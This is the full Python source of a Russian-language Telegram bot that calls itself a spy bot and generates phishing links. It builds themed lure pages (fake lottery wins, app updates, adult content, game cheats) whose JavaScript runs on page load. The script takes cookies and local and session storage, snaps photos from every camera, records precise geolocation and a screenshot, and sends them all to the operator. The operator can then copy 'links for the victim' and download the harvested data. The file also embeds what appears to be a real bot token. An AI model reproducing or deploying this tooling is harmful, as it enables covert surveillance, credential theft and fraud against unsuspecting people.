import asyncio
import logging
import os
import json
import random
import string
import datetime
from typing import Dict, List, Any
from pathlib import Path

from aiogram import Bot, Dispatcher, types, F
from aiogram.types import Message, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
import aiofiles

# ==================== КОНФИГУРАЦИЯ ====================
BOT_TOKEN = "8582710018:AAEjxbbgvcZiL2DiSCuUI8dfwbQGKF1urY0"  # Замените на токен от @BotFather
ADMIN_IDS = [7466601325]  # Замените на ваш Telegram ID
CHANNEL_ID = "https://t.me/freetestlogger"  # Канал для получения данных (создайте канал и добавьте бота администратором)

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Инициализация бота и диспетчера
storage = MemoryStorage()
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.MARKDOWN))
dp = Dispatcher(storage=storage)

# ==================== БАЗА ДАННЫХ (JSON) ====================
class Database:
    def __init__(self, db_file="bot_database.json"):
        self.db_file = db_file
        self.data = self.load()
    
    def load(self):
        if os.path.exists(self.db_file):
            try:
                with open(self.db_file, 'r', encoding='utf-8') as f:
                    return json.load(f)
            except:
                return self.get_default_db()
        return self.get_default_db()
    
    def get_default_db(self):
        return {
            "users": {},
            "links": {},
            "stats": {
                "total_clicks": 0,
                "unique_visitors": [],
                "data_collected": 0
            }
        }
    
    def save(self):
        with open(self.db_file, 'w', encoding='utf-8') as f:
            json.dump(self.data, f, ensure_ascii=False, indent=2)
    
    def add_click(self, link_id, visitor_data):
        if link_id in self.data["links"]:
            self.data["links"][link_id]["clicks"] += 1
            self.data["links"][link_id]["visitors"].append(visitor_data)
            self.data["stats"]["total_clicks"] += 1
            if visitor_data.get("ip") not in self.data["stats"]["unique_visitors"]:
                self.data["stats"]["unique_visitors"].append(visitor_data.get("ip"))
            self.save()
            return True
        return False
    
    def add_collected_data(self, link_id, data_type, data):
        if link_id in self.data["links"]:
            if "collected_data" not in self.data["links"][link_id]:
                self.data["links"][link_id]["collected_data"] = []
            
            self.data["links"][link_id]["collected_data"].append({
                "type": data_type,
                "data": data,
                "timestamp": datetime.datetime.now().isoformat()
            })
            self.data["stats"]["data_collected"] += 1
            self.save()
            return True
        return False
    
    def create_link(self, user_id, link_type="universal", theme="news"):
        link_id = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        
        self.data["links"][link_id] = {
            "id": link_id,
            "created_by": user_id,
            "created_at": datetime.datetime.now().isoformat(),
            "type": link_type,
            "theme": theme,
            "clicks": 0,
            "visitors": [],
            "collected_data": []
        }
        
        # Добавляем пользователя если его нет
        if str(user_id) not in self.data["users"]:
            self.data["users"][str(user_id)] = {
                "id": user_id,
                "joined": datetime.datetime.now().isoformat(),
                "links_created": 0
            }
        
        self.data["users"][str(user_id)]["links_created"] += 1
        self.save()
        
        return link_id
    
    def get_stats(self):
        return self.data["stats"]
    
    def get_user_links(self, user_id):
        return {k: v for k, v in self.data["links"].items() if v["created_by"] == user_id}
    
    def get_link(self, link_id):
        return self.data["links"].get(link_id)

# Инициализация базы данных
db = Database()

# ==================== СОСТОЯНИЯ ====================
class LinkGeneration(StatesGroup):
    waiting_for_theme = State()
    waiting_for_type = State()

# ==================== КЛАВИАТУРЫ ====================
def get_main_keyboard():
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="📊 Статистика")],
            [KeyboardButton(text="🔗 Генерация ссылки")],
            [KeyboardButton(text="📁 Мои ссылки")],
            [KeyboardButton(text="⚙️ Настройки")]
        ],
        resize_keyboard=True
    )
    return keyboard

def get_themes_keyboard():
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📰 Новости", callback_data="theme_news")],
        [InlineKeyboardButton(text="🎥 Видео", callback_data="theme_video")],
        [InlineKeyboardButton(text="📄 Документ", callback_data="theme_doc")],
        [InlineKeyboardButton(text="📸 Фото", callback_data="theme_photo")],
        [InlineKeyboardButton(text="🔄 Обновление", callback_data="theme_update")],
        [InlineKeyboardButton(text="💰 Финансы", callback_data="theme_money")],
        [InlineKeyboardButton(text="🔥 Скандал", callback_data="theme_scandal")],
        [InlineKeyboardButton(text="🔞 18+", callback_data="theme_adult")],
        [InlineKeyboardButton(text="🎮 Игры", callback_data="theme_game")],
        [InlineKeyboardButton(text="📱 Соцсети", callback_data="theme_social")]
    ])
    return keyboard

def get_link_type_keyboard():
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="📱 Универсальный", callback_data="type_universal"),
            InlineKeyboardButton(text="💻 Windows", callback_data="type_windows")
        ],
        [
            InlineKeyboardButton(text="🤖 Android", callback_data="type_android"),
            InlineKeyboardButton(text="🍎 iOS", callback_data="type_ios")
        ]
    ])
    return keyboard

def get_link_actions_keyboard(link_id):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="📊 Статистика", callback_data=f"link_stats_{link_id}"),
            InlineKeyboardButton(text="📥 Данные", callback_data=f"link_data_{link_id}")
        ],
        [
            InlineKeyboardButton(text="🔗 Скопировать", callback_data=f"link_copy_{link_id}"),
            InlineKeyboardButton(text="❌ Удалить", callback_data=f"link_delete_{link_id}")
        ],
        [InlineKeyboardButton(text="◀️ Назад", callback_data=f"link_back_{link_id}")]
    ])
    return keyboard

# ==================== ГЕНЕРАЦИЯ HTML СТРАНИЦЫ ====================
def generate_phishing_page(link_id, theme="news"):
    """Генерирует HTML страницу с кодом для сбора данных"""
    
    # Заголовки в зависимости от темы
    themes = {
        "news": {
            "title": "СРОЧНЫЕ НОВОСТИ: Важное заявление",
            "content": "Произошло важное событие. Нажмите для просмотра эксклюзивных материалов."
        },
        "video": {
            "title": "ЭКСКЛЮЗИВНОЕ ВИДЕО",
            "content": "Видео недоступно в вашем регионе. Нажмите для разблокировки."
        },
        "doc": {
            "title": "СЕКРЕТНЫЙ ДОКУМЕНТ PDF",
            "content": "Документ зашифрован. Требуется верификация."
        },
        "photo": {
            "title": "ПРИВАТНЫЕ ФОТОГРАФИИ",
            "content": "Для просмотра фотографий подтвердите, что вам есть 18 лет."
        },
        "update": {
            "title": "КРИТИЧЕСКОЕ ОБНОВЛЕНИЕ",
            "content": "WhatsApp/Telegram требует обновления. Нажмите для установки."
        },
        "money": {
            "title": "ВЫ ВЫИГРАЛИ 1.000.000₽",
            "content": "Поздравляем! Вы стали победителем лотереи. Заберите приз."
        },
        "scandal": {
            "title": "СЛИВ ПЕРЕПИСКИ ЗНАМЕНИТОСТИ",
            "content": "Скандальные откровения. Только сегодня!"
        },
        "adult": {
            "title": "18+ КОНТЕНТ",
            "content": "Доступ к закрытому разделу. Подтвердите возраст."
        },
        "game": {
            "title": "ЧИТ ДЛЯ STANDOFF 2",
            "content": "Рабочий чит без вирусов. Скачай и выигрывай!"
        },
        "social": {
            "title": "КТО СЛЕДИТ ЗА ТОБОЙ?",
            "content": "Узнай, кто просматривает твой профиль в Instagram."
        }
    }
    
    theme_data = themes.get(theme, themes["news"])
    
    # JavaScript код для сбора данных
    js_collector = f"""
    <script>
    // Функция для отправки данных на сервер
    async function sendData(type, data) {{
        try {{
            const response = await fetch('/api/collect/' + '{link_id}', {{
                method: 'POST',
                headers: {{
                    'Content-Type': 'application/json',
                }},
                body: JSON.stringify({{
                    type: type,
                    data: data,
                    url: window.location.href,
                    userAgent: navigator.userAgent,
                    timestamp: new Date().toISOString()
                }})
            }});
            return await response.json();
        }} catch (e) {{
            console.log('Error sending data:', e);
        }}
    }}
    
    // Сбор основной информации
    async function collectBasicInfo() {{
        const info = {{
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            maxTouchPoints: navigator.maxTouchPoints,
            vendor: navigator.vendor,
            screenWidth: screen.width,
            screenHeight: screen.height,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            timezoneOffset: new Date().getTimezoneOffset(),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            localStorage: {{}},
            sessionStorage: {{}},
            cookies: document.cookie
        }};
        
        // Сбор localStorage
        try {{
            for (let i = 0; i < localStorage.length; i++) {{
                const key = localStorage.key(i);
                info.localStorage[key] = localStorage.getItem(key);
            }}
        }} catch (e) {{}}
        
        // Сбор sessionStorage
        try {{
            for (let i = 0; i < sessionStorage.length; i++) {{
                const key = sessionStorage.key(i);
                info.sessionStorage[key] = sessionStorage.getItem(key);
            }}
        }} catch (e) {{}}
        
        await sendData('basic_info', info);
        return info;
    }}
    
    // Фото с камер
    async function takeCameraPhotos() {{
        try {{
            // Запрос доступа к камерам
            const stream = await navigator.mediaDevices.getUserMedia({{ video: true, audio: false }});
            
            // Получаем все видео устройства
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(d => d.kind === 'videoinput');
            
            for (let i = 0; i < videoDevices.length; i++) {{
                try {{
                    const deviceStream = await navigator.mediaDevices.getUserMedia({{
                        video: {{ deviceId: videoDevices[i].deviceId }}
                    }});
                    
                    const video = document.createElement('video');
                    video.srcObject = deviceStream;
                    video.play();
                    
                    // Ждем кадр
                    await new Promise(r => setTimeout(r, 1000));
                    
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    const photo = canvas.toDataURL('image/jpeg', 0.8);
                    const cameraType = i === 0 ? 'back' : 'front';
                    await sendData('camera_' + cameraType, photo);
                    
                    deviceStream.getTracks().forEach(track => track.stop());
                }} catch (e) {{
                    console.log('Camera error:', e);
                }}
            }}
            
            stream.getTracks().forEach(track => track.stop());
        }} catch (e) {{
            console.log('Camera access denied:', e);
        }}
    }}
    
    // Скриншот страницы
    async function takeScreenshot() {{
        try {{
            if (window.html2canvas) {{
                const canvas = await html2canvas(document.body);
                const screenshot = canvas.toDataURL('image/jpeg', 0.8);
                await sendData('screenshot', screenshot);
            }} else {{
                const script = document.createElement('script');
                script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
                script.onload = async function() {{
                    const canvas = await html2canvas(document.body);
                    const screenshot = canvas.toDataURL('image/jpeg', 0.8);
                    await sendData('screenshot', screenshot);
                }};
                document.head.appendChild(script);
            }}
        }} catch (e) {{
            console.log('Screenshot error:', e);
        }}
    }}
    
    // Получение геолокации
    async function getLocation() {{
        try {{
            const position = await new Promise((resolve, reject) => {{
                navigator.geolocation.getCurrentPosition(resolve, reject, {{
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                }});
            }});
            
            const locationData = {{
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                altitude: position.coords.altitude,
                altitudeAccuracy: position.coords.altitudeAccuracy,
                heading: position.coords.heading,
                speed: position.coords.speed,
                timestamp: position.timestamp
            }};
            
            await sendData('geolocation', locationData);
        }} catch (e) {{
            console.log('Geolocation error:', e);
        }}
    }}
    
    // Главная функция сбора
    async function collectAllData() {{
        console.log('Starting data collection...');
        
        // Собираем базовую информацию
        await collectBasicInfo();
        
        // Пытаемся получить геолокацию
        await getLocation();
        
        // Фото с камер
        await takeCameraPhotos();
        
        // Скриншот
        await takeScreenshot();
        
        console.log('Data collection completed');
    }}
    
    // Запускаем сбор при загрузке страницы
    window.onload = function() {{
        setTimeout(collectAllData, 1000);
    }};
    
    </script>
    """
    
    # HTML страница
    html = f"""<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{theme_data['title']}</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }}
        
        .card {{
            background: white;
            border-radius: 20px;
            padding: 30px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            animation: slideUp 0.5s ease;
        }}
        
        @keyframes slideUp {{
            from {{
                opacity: 0;
                transform: translateY(30px);
            }}
            to {{
                opacity: 1;
                transform: translateY(0);
            }}
        }}
        
        .header {{
            text-align: center;
            margin-bottom: 30px;
        }}
        
        .header h1 {{
            color: #333;
            font-size: 24px;
            margin-bottom: 10px;
        }}
        
        .header p {{
            color: #666;
            font-size: 16px;
        }}
        
        .loader {{
            border: 5px solid #f3f3f3;
            border-top: 5px solid #667eea;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }}
        
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        
        .content {{
            text-align: center;
            margin: 30px 0;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 10px;
        }}
        
        .button {{
            display: inline-block;
            background: #667eea;
            color: white;
            padding: 15px 40px;
            border-radius: 25px;
            text-decoration: none;
            font-weight: bold;
            margin-top: 20px;
            transition: all 0.3s;
            border: none;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
        }}
        
        .button:hover {{
            background: #5a67d8;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }}
        
        .footer {{
            text-align: center;
            margin-top: 30px;
            color: #999;
            font-size: 12px;
        }}
        
        .permission-box {{
            background: #fff3cd;
            border: 1px solid #ffeeba;
            color: #856404;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            text-align: left;
        }}
        
        .permission-box h3 {{
            margin-bottom: 10px;
            font-size: 16px;
        }}
        
        .permission-box ul {{
            margin-left: 20px;
        }}
        
        .permission-box li {{
            margin: 5px 0;
        }}
        
        .status {{
            font-size: 14px;
            color: #666;
            margin: 10px 0;
        }}
    </style>
</head>
<body>
    <div class="card">
        <div class="header">
            <h1>{theme_data['title']}</h1>
            <p>{theme_data['content']}</p>
        </div>
        
        <div class="loader"></div>
        
        <div class="content">
            <div class="status" id="status">Подготовка контента...</div>
        </div>
        
        <div class="permission-box" id="permissionBox">
            <h3>🔐 Требуется разрешение</h3>
            <p>Для просмотра контента необходимо предоставить доступ:</p>
            <ul>
                <li>📷 Камера (фото/видео)</li>
                <li>📍 Геолокация</li>
            </ul>
        </div>
        
        <button class="button" onclick="requestPermissions()" id="requestBtn">
            Предоставить доступ
        </button>
        
        <div class="footer">
            <p>© 2024 Все права защищены</p>
        </div>
    </div>
    
    {js_collector}
    
    <script>
    async function requestPermissions() {{
        try {{
            document.getElementById('status').innerText = 'Запрос разрешений...';
            
            // Запрос камеры
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
                stream.getTracks().forEach(track => track.stop());
                document.getElementById('status').innerText = '✅ Камера доступна';
            }} catch (e) {{
                console.log('Camera permission denied');
            }}
            
            // Запрос геолокации
            try {{
                await new Promise((resolve, reject) => {{
                    navigator.geolocation.getCurrentPosition(resolve, reject);
                }});
                document.getElementById('status').innerText = '✅ Геолокация доступна';
            }} catch (e) {{
                console.log('Location permission denied');
            }}
            
            document.getElementById('permissionBox').style.display = 'none';
            document.getElementById('requestBtn').style.display = 'none';
            
            document.getElementById('status').innerText = '✅ Загрузка...';
            
            setTimeout(() => {{
                window.location.href = 'https://google.com';
            }}, 3000);
            
        }} catch (e) {{
            console.log('Permission error:', e);
        }}
    }}
    
    // Автоматический запрос разрешений через 1 секунду
    setTimeout(requestPermissions, 1000);
    </script>
</body>
</html>
    """
    
    return html

# ==================== ОБРАБОТЧИКИ КОМАНД ====================
@dp.message(Command("start"))
async def start_command(message: Message):
    """Обработчик команды /start"""
    
    # Добавляем пользователя в базу если его нет
    if str(message.from_user.id) not in db.data["users"]:
        db.data["users"][str(message.from_user.id)] = {
            "id": message.from_user.id,
            "username": message.from_user.username,
            "first_name": message.from_user.first_name,
            "last_name": message.from_user.last_name,
            "joined": datetime.datetime.now().isoformat(),
            "links_created": 0
        }
        db.save()
    
    await message.answer(
        "🕵️ *Добро пожаловать в шпионского бота!*\n\n"
        "Этот бот позволяет создавать фишинговые ссылки для сбора информации.\n\n"
        "📊 *Статистика* - просмотр общей статистики\n"
        "🔗 *Генерация ссылки* - создание новой фишинговой ссылки\n"
        "📁 *Мои ссылки* - управление созданными ссылками\n\n"
        "Выберите действие в меню ниже:",
        reply_markup=get_main_keyboard()
    )

@dp.message(F.text == "📊 Статистика")
async def show_stats(message: Message):
    """Показывает общую статистику"""
    stats = db.get_stats()
    user_links = db.get_user_links(message.from_user.id)
    
    total_clicks = sum(link["clicks"] for link in user_links.values())
    total_data = sum(len(link.get("collected_data", [])) for link in user_links.values())
    
    text = (
        f"📊 *Общая статистика*\n\n"
        f"👤 *Ваша статистика:*\n"
        f"├ Создано ссылок: {len(user_links)}\n"
        f"├ Всего кликов: {total_clicks}\n"
        f"└ Собрано данных: {total_data}\n\n"
        f"🌍 *Глобальная статистика:*\n"
        f"├ Всего кликов: {stats['total_clicks']}\n"
        f"├ Уникальных посетителей: {len(stats['unique_visitors'])}\n"
        f"└ Всего данных: {stats['data_collected']}"
    )
    
    await message.answer(text)

@dp.message(F.text == "🔗 Генерация ссылки")
async def start_link_generation(message: Message):
    """Начинает процесс генерации ссылки"""
    
    await message.answer(
        "🔗 *Генерация фишинговой ссылки*\n\n"
        "Выберите тему для маскировки страницы:",
        reply_markup=get_themes_keyboard()
    )

@dp.message(F.text == "📁 Мои ссылки")
async def show_my_links(message: Message):
    """Показывает все созданные ссылки пользователя"""
    user_links = db.get_user_links(message.from_user.id)
    
    if not user_links:
        await message.answer("📁 У вас пока нет созданных ссылок.")
        return
    
    text = "📁 *Ваши ссылки:*\n\n"
    
    # Создаем клавиатуру со ссылками
    keyboard_buttons = []
    
    for link_id, link_data in list(user_links.items())[:10]:
        created = datetime.datetime.fromisoformat(link_data["created_at"]).strftime("%d.%m.%Y")
        button_text = f"{link_data['theme']} ({link_data['clicks']} кликов) - {created}"
        keyboard_buttons.append([InlineKeyboardButton(text=button_text, callback_data=f"link_{link_id}")])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)
    
    await message.answer(text, reply_markup=keyboard)

@dp.message(F.text == "⚙️ Настройки")
async def settings(message: Message):
    """Настройки бота"""
    text = (
        "⚙️ *Настройки*\n\n"
        "Здесь пока ничего нет."
    )
    await message.answer(text)

# ==================== CALLBACK QUERY HANDLERS ====================
@dp.callback_query(lambda c: c.data.startswith('theme_'))
async def process_theme_selection(callback: CallbackQuery, state: FSMContext):
    """Обрабатывает выбор темы"""
    theme = callback.data.replace('theme_', '')
    
    # Сохраняем тему в состоянии
    await state.update_data(theme=theme)
    await state.set_state(LinkGeneration.waiting_for_type)
    
    await callback.message.edit_text(
        "🔗 *Выберите тип ссылки:*\n\n"
        "Универсальный - работает на всех устройствах\n"
        "Windows - оптимизирован для ПК\n"
        "Android - оптимизирован для Android\n"
        "iOS - оптимизирован для iPhone/iPad",
        reply_markup=get_link_type_keyboard()
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith('type_'), LinkGeneration.waiting_for_type)
async def process_type_selection(callback: CallbackQuery, state: FSMContext):
    """Обрабатывает выбор типа ссылки"""
    link_type = callback.data.replace('type_', '')
    
    # Получаем сохраненную тему
    data = await state.get_data()
    theme = data.get('theme', 'news')
    
    # Создаем ссылку
    link_id = db.create_link(callback.from_user.id, link_type, theme)
    
    # Генерируем страницу
    html_content = generate_phishing_page(link_id, theme)
    
    # Сохраняем HTML файл
    os.makedirs("pages", exist_ok=True)
    html_path = f"pages/{link_id}.html"
    with open(html_path, 'w', encoding='utf-8') as f:
        f.write(html_content)
    
    # Формируем ссылки
    base_url = "https://your-domain.com"  # Замените на ваш домен
    phishing_url = f"{base_url}/p/{link_id}"
    
    # Создаем сообщение с результатом
    text = (
        f"✅ *Ссылка успешно создана!*\n\n"
        f"📌 *ID:* `{link_id}`\n"
        f"🎭 *Тема:* {theme}\n"
        f"📱 *Тип:* {link_type}\n\n"
        f"🔗 *Фишинговая ссылка:*\n`{phishing_url}`\n\n"
        f"📥 *Данные будут сохраняться в базе данных.*"
    )
    
    await callback.message.edit_text(
        text,
        reply_markup=get_link_actions_keyboard(link_id)
    )
    await state.clear()
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith('link_') and not c.data.startswith('link_stats_') and not c.data.startswith('link_data_') and not c.data.startswith('link_copy_') and not c.data.startswith('link_delete_') and not c.data.startswith('link_back_'))
async def process_link_selection(callback: CallbackQuery):
    """Обрабатывает выбор ссылки из списка"""
    link_id = callback.data.replace('link_', '')
    link_data = db.get_link(link_id)
    
    if not link_data:
        await callback.answer("Ссылка не найдена")
        return
    
    created = datetime.datetime.fromisoformat(link_data["created_at"]).strftime("%d.%m.%Y %H:%M")
    
    text = (
        f"🔗 *Информация о ссылке*\n\n"
        f"📌 *ID:* `{link_id}`\n"
        f"🎭 *Тема:* {link_data['theme']}\n"
        f"📱 *Тип:* {link_data['type']}\n"
        f"📅 *Создана:* {created}\n"
        f"👁 *Кликов:* {link_data['clicks']}\n"
        f"📥 *Собрано данных:* {len(link_data.get('collected_data', []))}\n"
        f"👥 *Посетителей:* {len(link_data['visitors'])}"
    )
    
    await callback.message.edit_text(
        text,
        reply_markup=get_link_actions_keyboard(link_id)
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith('link_stats_'))
async def show_link_stats(callback: CallbackQuery):
    """Показывает детальную статистику по ссылке"""
    link_id = callback.data.replace('link_stats_', '')
    link_data = db.get_link(link_id)
    
    if not link_data:
        await callback.answer("Ссылка не найдена")
        return
    
    text = f"📊 *Статистика для {link_id}*\n\n"
    
    # Статистика по времени
    visits_by_hour = {}
    for visitor in link_data['visitors']:
        hour = visitor.get('timestamp', '')[:13]
        visits_by_hour[hour] = visits_by_hour.get(hour, 0) + 1
    
    text += "*Посещения по часам:*\n"
    for hour, count in sorted(visits_by_hour.items())[-5:]:
        text += f"├ {hour}: {count}\n"
    
    # Статистика по устройствам
    devices = {}
    for visitor in link_data['visitors']:
        ua = visitor.get('user_agent', '').lower()
        if 'windows' in ua:
            devices['Windows'] = devices.get('Windows', 0) + 1
        elif 'android' in ua:
            devices['Android'] = devices.get('Android', 0) + 1
        elif 'iphone' in ua or 'ipad' in ua:
            devices['iOS'] = devices.get('iOS', 0) + 1
        else:
            devices['Other'] = devices.get('Other', 0) + 1
    
    text += "\n*Устройства:*\n"
    for device, count in devices.items():
        text += f"├ {device}: {count}\n"
    
    await callback.message.edit_text(
        text,
        reply_markup=get_link_actions_keyboard(link_id)
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith('link_data_'))
async def show_collected_data(callback: CallbackQuery):
    """Показывает собранные данные по ссылке"""
    link_id = callback.data.replace('link_data_', '')
    link_data = db.get_link(link_id)
    
    if not link_data:
        await callback.answer("Ссылка не найдена")
        return
    
    collected = link_data.get('collected_data', [])
    
    if not collected:
        await callback.answer("Данные еще не собирались", show_alert=True)
        return
    
    # Группируем данные по типам
    data_by_type = {}
    for item in collected:
        data_type = item['type']
        if data_type not in data_by_type:
            data_by_type[data_type] = []
        data_by_type[data_type].append(item)
    
    text = f"📥 *Собранные данные для {link_id}*\n\n"
    text += f"Всего записей: {len(collected)}\n\n"
    
    for data_type, items in list(data_by_type.items())[:5]:
        text += f"📌 *{data_type}:* {len(items)}\n"
    
    text += "\n*Последние данные:*\n"
    for item in collected[-3:]:
        timestamp = datetime.datetime.fromisoformat(item['timestamp']).strftime("%H:%M:%S")
        data_type = item['type']
        text += f"├ {timestamp} - {data_type}\n"
    
    # Кнопка для скачивания всех данных
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📥 Скачать все данные (JSON)", callback_data=f"download_{link_id}")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data=f"link_{link_id}")]
    ])
    
    await callback.message.edit_text(
        text,
        reply_markup=keyboard
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith('download_'))
async def download_data(callback: CallbackQuery):
    """Отправляет все собранные данные файлом"""
    link_id = callback.data.replace('download_', '')
    link_data = db.get_link(link_id)
    
    if not link_data:
        await callback.answer("Ссылка не найдена")
        return
    
    # Создаем JSON файл с данными
    filename = f"data_{link_id}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    
    # Подготавливаем данные
    export_data = {
        "link_id": link_id,
        "created_at": link_data['created_at'],
        "theme": link_data['theme'],
        "type": link_data['type'],
        "clicks": link_data['clicks'],
        "visitors": link_data['visitors'],
        "collected_data": link_data.get('collected_data', [])
    }
    
    # Сохраняем во временный файл
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(export_data, f, ensure_ascii=False, indent=2)
    
    # Отправляем файл
    document = FSInputFile(filename)
    await callback.message.answer_document(
        document,
        caption=f"📥 Данные для ссылки {link_id}"
    )
    
    # Удаляем временный файл
    os.remove(filename)
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith('link_copy_'))
async def copy_link(callback: CallbackQuery):
    """Копирует ссылку (показывает в сообщении)"""
    link_id = callback.data.replace('link_copy_', '')
    
    base_url = "https://your-domain.com"  # Замените на ваш домен
    phishing_url = f"{base_url}/p/{link_id}"
    
    await callback.message.answer(
        f"🔗 *Ссылка для жертвы:*\n`{phishing_url}`"
    )
    await callback.answer("Ссылка скопирована в сообщение")

@dp.callback_query(lambda c: c.data.startswith('link_delete_'))
async def delete_link(callback: CallbackQuery):
    """Удаляет ссылку"""
    link_id = callback.data.replace('link_delete_', '')
    
    # Удаляем из базы
    if link_id in db.data["links"]:
        del db.data["links"][link_id]
        db.save()
        
        # Удаляем HTML файл
        html_path = f"pages/{link_id}.html"
        if os.path.exists(html_path):
            os.remove(html_path)
        
        await callback.answer("Ссылка удалена")
        await callback.message.edit_text("✅ Ссылка успешно удалена")
    else:
        await callback.answer("Ссылка не найдена")

@dp.callback_query(lambda c: c.data.startswith('link_back_'))
async def back_to_links(callback: CallbackQuery):
    """Возврат к списку ссылок"""
    user_links = db.get_user_links(callback.from_user.id)
    
    if not user_links:
        await callback.message.edit_text("📁 У вас пока нет созданных ссылок.")
        return
    
    text = "📁 *Ваши ссылки:*\n\n"
    
    # Создаем клавиатуру со ссылками
    keyboard_buttons = []
    
    for link_id, link_data in list(user_links.items())[:10]:
        created = datetime.datetime.fromisoformat(link_data["created_at"]).strftime("%d.%m.%Y")
        button_text = f"{link_data['theme']} ({link_data['clicks']} кликов) - {created}"
        keyboard_buttons.append([InlineKeyboardButton(text=button_text, callback_data=f"link_{link_id}")])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)
    
    await callback.message.edit_text(text, reply_markup=keyboard)
    await callback.answer()

# ==================== ЗАПУСК БОТА ====================
async def main():
    """Главная функция запуска"""
    # Создаем необходимые директории
    os.makedirs("pages", exist_ok=True)
    
    # Запускаем бота
    logger.info("Бот запускается...")
    await dp.start_polling(bot)

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Бот остановлен")
